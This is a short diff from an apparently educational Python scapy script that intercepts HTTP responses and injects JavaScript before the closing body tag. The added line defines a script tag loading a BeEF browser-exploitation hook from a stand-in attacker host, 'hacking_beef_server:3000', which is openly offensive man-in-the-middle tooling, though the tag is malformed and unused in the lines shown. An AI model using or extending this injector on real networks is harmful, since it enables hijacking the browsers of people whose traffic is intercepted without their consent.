@@ -32,6 +32,7 @@ def process_packet(packet):
             elif scapy_packet[scapy.TCP].sport == port or scapy_packet[scapy.TCP].sport == "http":
                 # Inject JavaScript to the response.
                 inject_code = "<script>alert('Injected code!');</script>"
+                inject_hook = '<script> src="http://hacking_beef_server:3000/hook.js"</script>'
 
                 modified_load = modified_load.replace("</body>", inject_code + "</body>")
                 content_length = re.search("(?:Content-Length:\s)(\d*)", modified_load)
